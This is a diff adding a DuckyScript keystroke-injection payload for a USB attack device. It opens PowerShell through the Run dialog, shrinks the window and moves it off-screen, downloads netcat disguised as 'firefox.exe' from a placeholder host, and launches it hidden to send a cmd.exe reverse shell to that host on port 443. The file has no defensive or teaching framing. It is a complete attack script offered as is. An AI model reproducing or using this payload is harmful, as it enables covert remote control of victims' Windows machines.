@@ -1,0 +1,26 @@
+REM *** Initial Delay *** 
+DELAY 2000
+
+REM *** Open powershell ***
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 400
+
+REM *** Hide PowerShell ***
+STRING [console]::WindowHeight=1
+ENTER
+STRING [console]::WindowWidth=1
+ENTER
+ALT SPACE
+STRING m
+LEFTARROW
+REPEAT 60
+ENTER
+
+REM *** Download NC and get rev shell ***
+STRING (New-Object Net.Webclient).DownloadFile('http://x.x.x.x/firefox.exe','firefox.exe');
+STRING Start-Process -windowstyle hidden -FilePath 'cmd' -ArgumentList '/c firefox.exe -e cmd.exe x.x.x.x 443';
+STRING exit
+ENTER
